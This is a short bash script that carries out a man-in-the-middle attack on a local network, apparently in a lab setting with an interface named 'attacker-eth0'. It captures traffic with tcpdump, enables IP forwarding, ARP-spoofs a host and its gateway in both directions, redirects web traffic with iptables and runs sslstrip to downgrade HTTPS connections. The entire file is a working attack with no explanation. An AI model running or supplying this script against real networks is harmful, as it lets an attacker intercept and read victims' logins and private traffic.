#! /bin/bash

tcpdump -i attacker-eth0 -w capture.pcap -Z root > /dev/null 2> /dev/null &
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof \
	-i attacker-eth0 \
	-t 192.168.16.3 192.168.16.1 \
	> /dev/null 2> /dev/null &
arpspoof \
	-i attacker-eth0 \
	-t 192.168.16.1 192.168.16.3 \
	> /dev/null 2> /dev/null &
iptables \
	-t nat \
	-p tcp \
	-A PREROUTING \
	--destination-port 80 \
	-j REDIRECT \
	--to-port 8080
sslstrip -l 8080
